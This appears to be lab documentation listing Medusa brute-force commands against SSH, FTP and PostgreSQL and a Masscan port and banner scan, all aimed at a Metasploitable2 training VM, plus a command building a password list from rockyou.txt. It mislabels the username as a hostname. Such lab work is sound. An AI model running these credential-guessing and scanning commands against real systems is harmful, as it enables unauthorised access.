# Attack Tool Commands

## Description

This document contains the commands used to run the attack tools against services running on the Metasploitable2 virtual machine.

## Medusa

For each of the services tested, the hostname used is `msfadmin` and the password list used is `password_list.txt`. The password list was generated using using the first 28 passwords from the `rockyou.txt` password list with two additional passwords `msfadmin` and `postgres` added to the end of the list to generate found cases.

The command used to generate the `password_list.txt` file is:

```bash
tail -n +6 rockyou.txt | head -n 28 > password_list.txt && echo "msfadmin" >> password_list.txt && echo "postgres" >> password_list.txt
```

```bash
# SSH Brute Force
medusa -h 192.168.1.100 -u msfadmin -P password_list.txt -M ssh -n 22

# FTP Brute Force
medusa -h 192.168.1.100 -u msfadmin -P password_list.txt -M ftp -n 21

# PostgreSQL Brute Force
medusa -h 192.168.1.100 -u postgres -P password_list.txt -M postgres -n 5432
```

## Masscan

```bash
# List available network interfaces
masscan --iflist

# Scan all ports on the target machine using the specified network interface
sudo masscan -p21-8180 192.168.1.100 --banners --packet-trace --source-mac <IFACE_MAC_ADDR> 
```
